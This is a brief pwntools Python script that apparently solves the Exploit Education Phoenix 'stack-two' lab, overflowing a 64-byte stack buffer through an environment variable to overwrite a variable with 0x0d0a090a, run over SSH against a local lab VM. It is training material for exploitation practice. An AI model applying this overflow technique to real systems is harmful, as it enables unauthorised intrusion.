from pwn import *
import warnings
warnings.filterwarnings("ignore")


challenge_name = "stack-two"

payload ='A'*64 + p32(0x0d0a090a)

shell = ssh('user','localhost',port=2222,password='user')

conn = shell.process('/opt/phoenix/i486/{}'.format(challenge_name),env={'ExploitEducation':str(payload)})

conn.interactive()
conn.close()